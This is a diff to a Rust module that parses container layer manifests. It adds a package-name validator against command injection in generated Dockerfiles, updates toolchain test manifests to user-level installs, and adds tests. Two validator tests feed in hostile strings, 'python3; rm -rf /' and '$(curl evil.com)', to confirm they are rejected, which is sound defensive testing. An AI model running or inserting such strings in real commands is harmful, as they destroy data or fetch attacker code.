@@ -84,6 +84,38 @@ pub struct RootInstall {
     pub packages: Vec<String>,
 }
 
+/// Allowed characters in dnf package names: alphanumeric, hyphens, underscores, dots, plus signs
+fn is_valid_package_char(c: char) -> bool {
+    c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '+'
+}
+
+impl RootInstall {
+    /// Validate that package names contain only safe characters.
+    ///
+    /// Prevents command injection when package names are interpolated
+    /// into `RUN dnf install` in generated Dockerfiles.
+    pub fn validate(&self) -> MinoResult<()> {
+        for pkg in &self.packages {
+            if pkg.is_empty() {
+                return Err(MinoError::ConfigInvalid {
+                    path: "layer.toml".into(),
+                    reason: "root_install.packages contains an empty package name".to_string(),
+                });
+            }
+            if !pkg.chars().all(is_valid_package_char) {
+                return Err(MinoError::ConfigInvalid {
+                    path: "layer.toml".into(),
+                    reason: format!(
+                        "invalid package name '{}': must contain only alphanumeric characters, hyphens, underscores, dots, or plus signs",
+                        pkg
+                    ),
+                });
+            }
+        }
+        Ok(())
+    }
+}
+
 /// Valid runtime manager names for user-level installs
 const VALID_RUNTIMES: &[&str] = &["nvm", "rustup", "uv"];
 
@@ -236,26 +268,31 @@ mod tests {
 [layer]
 name = "rust"
 description = "Rust stable toolchain + cargo tools"
-version = "1"
+version = "2"
 
 [env]
-CARGO_HOME = "/cache/cargo"
-RUSTUP_HOME = "/opt/rustup"
+CARGO_HOME = "/home/developer/.cargo"
+RUSTUP_HOME = "/home/developer/.rustup"
 RUSTC_WRAPPER = "sccache"
 SCCACHE_DIR = "/cache/sccache"
 
 [env.path_prepend]
-dirs = ["/opt/cargo/bin"]
+dirs = ["/home/developer/.cargo/bin"]
 
 [cache]
-paths = ["/cache/cargo", "/cache/sccache"]
+paths = ["/cache/sccache"]
+
+[user_install]
+runtime = "rustup"
+runtime_version = "stable"
+cargo_tools = ["bacon", "sccache"]
 "#;
 
     const TS_MANIFEST: &str = r#"
 [layer]
 name = "typescript"
 description = "Node.js + pnpm + TypeScript toolchain"
-version = "1"
+version = "2"
 
 [env]
 PNPM_HOME = "/cache/pnpm"
@@ -263,29 +300,45 @@ npm_config_cache = "/cache/npm"
 NODE_ENV = "development"
 
 [env.path_prepend]
-dirs = ["/cache/pnpm"]
+dirs = ["/cache/pnpm", "/home/developer/.npm-global/bin"]
 
 [cache]
 paths = ["/cache/pnpm", "/cache/npm"]
+
+[user_install]
+runtime = "nvm"
+runtime_version = "22"
+npm_globals = ["pnpm", "tsx"]
 "#;
 
     #[test]
     fn parse_rust_manifest() {
         let manifest = LayerManifest::parse(RUST_MANIFEST).unwrap();
         assert_eq!(manifest.layer.name, "rust");
-        assert_eq!(manifest.layer.version, "1");
+        assert_eq!(manifest.layer.version, "2");
 
         let vars = manifest.env_vars();
-        assert_eq!(vars.get("CARGO_HOME").unwrap(), "/cache/cargo");
-        assert_eq!(vars.get("RUSTUP_HOME").unwrap(), "/opt/rustup");
+        assert_eq!(vars.get("CARGO_HOME").unwrap(), "/home/developer/.cargo");
+        assert_eq!(vars.get("RUSTUP_HOME").unwrap(), "/home/developer/.rustup");
         assert_eq!(vars.get("RUSTC_WRAPPER").unwrap(), "sccache");
         assert_eq!(vars.get("SCCACHE_DIR").unwrap(), "/cache/sccache");
 
         assert_eq!(
             manifest.path_prepend_str(),
-            Some("/opt/cargo/bin".to_string())
+            Some("/home/developer/.cargo/bin".to_string())
         );
-        assert_eq!(manifest.cache.paths, vec!["/cache/cargo", "/cache/sccache"]);
+        assert_eq!(manifest.cache.paths, vec!["/cache/sccache"]);
+
+        assert!(manifest.has_user_install());
+        assert_eq!(manifest.user_install.runtime.as_deref(), Some("rustup"));
+        assert_eq!(
+            manifest.user_install.runtime_version.as_deref(),
+            Some("stable")
+        );
+        assert_eq!(
+            manifest.user_install.cargo_tools,
+            vec!["bacon", "sccache"]
+        );
     }
 
     #[test]
@@ -298,7 +351,18 @@ paths = ["/cache/pnpm", "/cache/npm"]
         assert_eq!(vars.get("npm_config_cache").unwrap(), "/cache/npm");
         assert_eq!(vars.get("NODE_ENV").unwrap(), "development");
 
-        assert_eq!(manifest.path_prepend_str(), Some("/cache/pnpm".to_string()));
+        assert_eq!(
+            manifest.path_prepend_str(),
+            Some("/cache/pnpm:/home/developer/.npm-global/bin".to_string())
+        );
+
+        assert!(manifest.has_user_install());
+        assert_eq!(manifest.user_install.runtime.as_deref(), Some("nvm"));
+        assert_eq!(
+            manifest.user_install.runtime_version.as_deref(),
+            Some("22")
+        );
+        assert_eq!(manifest.user_install.npm_globals, vec!["pnpm", "tsx"]);
     }
 
     #[test]
@@ -460,5 +524,206 @@ uv_tools = ["ruff", "pytest"]
         // Empty fields should be omitted
         assert!(parsed.get("cargo_tools").is_none());
         assert!(parsed.get("uv_tools").is_none());
+    }
+
+    // --- RootInstall validation tests ---
+
+    #[test]
+    fn root_install_validate_valid_packages() {
+        let install = RootInstall {
+            packages: vec![
+                "python3".to_string(),
+                "python3-devel".to_string(),
+                "gcc-c++".to_string(),
+                "libffi.x86_64".to_string(),
+            ],
+        };
+        assert!(install.validate().is_ok());
+    }
+
+    #[test]
+    fn root_install_validate_rejects_shell_injection() {
+        let install = RootInstall {
+            packages: vec!["python3; rm -rf /".to_string()],
+        };
+        let err = install.validate().unwrap_err();
+        assert!(err.to_string().contains("invalid package name"));
+    }
+
+    #[test]
+    fn root_install_validate_rejects_command_substitution() {
+        let install = RootInstall {
+            packages: vec!["$(curl evil.com)".to_string()],
+        };
+        assert!(install.validate().is_err());
+    }
+
+    #[test]
+    fn root_install_validate_rejects_empty_name() {
+        let install = RootInstall {
+            packages: vec!["".to_string()],
+        };
+        let err = install.validate().unwrap_err();
+        assert!(err.to_string().contains("empty package name"));
+    }
+
+    #[test]
+    fn root_install_validate_empty_list() {
+        let install = RootInstall::default();
+        assert!(install.validate().is_ok());
+    }
+
+    // --- build_layer_manifest tests ---
+
+    fn make_resolved_layer(
+        manifest_toml: &str,
+    ) -> crate::layer::resolve::ResolvedLayer {
+        crate::layer::resolve::ResolvedLayer {
+            manifest: LayerManifest::parse(manifest_toml).unwrap(),
+            install_script: crate::layer::resolve::LayerScript::None,
+            source: crate::layer::resolve::LayerSource::BuiltIn,
+        }
+    }
+
+    #[test]
+    fn build_layer_manifest_filters_non_user_install() {
+        let layer_without = make_resolved_layer(
+            r#"
+[layer]
+name = "minimal"
+description = "No user install"
+version = "1"
+"#,
+        );
+
+        let result = build_layer_manifest(&[layer_without]).unwrap();
+        assert!(result.is_none());
+    }
+
+    #[test]
+    fn build_layer_manifest_includes_user_install_layers() {
+        let layer_with = make_resolved_layer(
+            r#"
+[layer]
+name = "typescript"
+description = "TypeScript"
+version = "2"
+
+[user_install]
+runtime = "nvm"
+runtime_version = "22"
+npm_globals = ["pnpm", "tsx"]
+"#,
+        );
+
+        let json_str = build_layer_manifest(&[layer_with]).unwrap().unwrap();
+        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_str).unwrap();
+
+        assert_eq!(parsed.len(), 1);
+        assert_eq!(parsed[0]["name"], "typescript");
+        assert_eq!(parsed[0]["runtime"], "nvm");
+        assert_eq!(parsed[0]["runtime_version"], "22");
+        assert_eq!(parsed[0]["npm_globals"][0], "pnpm");
+        assert_eq!(parsed[0]["npm_globals"][1], "tsx");
+    }
+
+    #[test]
+    fn build_layer_manifest_multiple_layers_filters_correctly() {
+        let layer_no_install = make_resolved_layer(
+            r#"
+[layer]
+name = "minimal"
+description = "No user install"
+version = "1"
+"#,
+        );
+
+        let layer_rust = make_resolved_layer(
+            r#"
+[layer]
+name = "rust"
+description = "Rust"
+version = "2"
+
+[user_install]
+runtime = "rustup"
+runtime_version = "stable"
+cargo_tools = ["bacon"]
+"#,
+        );
+
+        let layer_ts = make_resolved_layer(
+            r#"
+[layer]
+name = "typescript"
+description = "TypeScript"
+version = "2"
+
+[user_install]
+runtime = "nvm"
+npm_globals = ["pnpm"]
+"#,
+        );
+
+        let json_str =
+            build_layer_manifest(&[layer_no_install, layer_rust, layer_ts])
+                .unwrap()
+                .unwrap();
+        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_str).unwrap();
+
+        // Only the two layers with user_install should be included
+        assert_eq!(parsed.len(), 2);
+        assert_eq!(parsed[0]["name"], "rust");
+        assert_eq!(parsed[0]["runtime"], "rustup");
+        assert_eq!(parsed[0]["cargo_tools"][0], "bacon");
+        assert_eq!(parsed[1]["name"], "typescript");
+        assert_eq!(parsed[1]["runtime"], "nvm");
+    }
+
+    #[test]
+    fn build_layer_manifest_omits_empty_fields() {
+        let layer = make_resolved_layer(
+            r#"
+[layer]
+name = "rust"
+description = "Rust"
+version = "2"
+
+[user_install]
+runtime = "rustup"
+"#,
+        );
+
+        let json_str = build_layer_manifest(&[layer]).unwrap().unwrap();
+        let parsed: Vec<serde_json::Value> = serde_json::from_str(&json_str).unwrap();
+
+        assert_eq!(parsed[0]["name"], "rust");
+        assert_eq!(parsed[0]["runtime"], "rustup");
+        // Empty optional/list fields should be omitted (skip_serializing_if)
+        assert!(parsed[0].get("runtime_version").is_none());
+        assert!(parsed[0].get("npm_globals").is_none());
+        assert!(parsed[0].get("cargo_tools").is_none());
+        assert!(parsed[0].get("uv_tools").is_none());
+    }
+
+    #[test]
+    fn build_layer_manifest_produces_valid_json() {
+        let layer = make_resolved_layer(
+            r#"
+[layer]
+name = "python"
+description = "Python"
+version = "2"
+
+[user_install]
+runtime = "uv"
+uv_tools = ["ruff", "pytest"]
+"#,
+        );
+
+        let json_str = build_layer_manifest(&[layer]).unwrap().unwrap();
+        // Verify it parses as valid JSON array
+        let parsed: serde_json::Value = serde_json::from_str(&json_str).unwrap();
+        assert!(parsed.is_array());
     }
 }
